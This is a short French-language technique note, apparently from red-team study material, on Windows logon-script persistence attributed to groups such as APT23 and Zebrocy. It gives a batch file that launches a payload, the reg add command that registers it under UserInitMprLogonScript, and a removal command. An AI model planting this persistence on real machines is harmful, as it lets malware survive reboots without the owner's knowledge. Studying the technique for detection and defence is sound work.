
> [!NOTE] APT23, Cobalt Group, Zebrocy

Quand un utilisateur se connecte, il y'a un processe qui s'appele `UserInit` qui fait un tas de chose pour l'utilisateur et l'un d'eux lance le `Logon Scripts` et c'est une fonctionnalite que nous pouvons utiliser.

Contenu de `logon.bat` qui contient le chemin absolut vers le payload

```c
@ECHO OFF
C:\pers\payload.exe
```

---

Setup:

```c
reg query "HKEY_CURRENT_USER\Environment"
```

```sh
reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "c:\pers\logon.bat" /t REG_SZ /f
```

_Supprimer_:
```http
reg delete "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /f
```


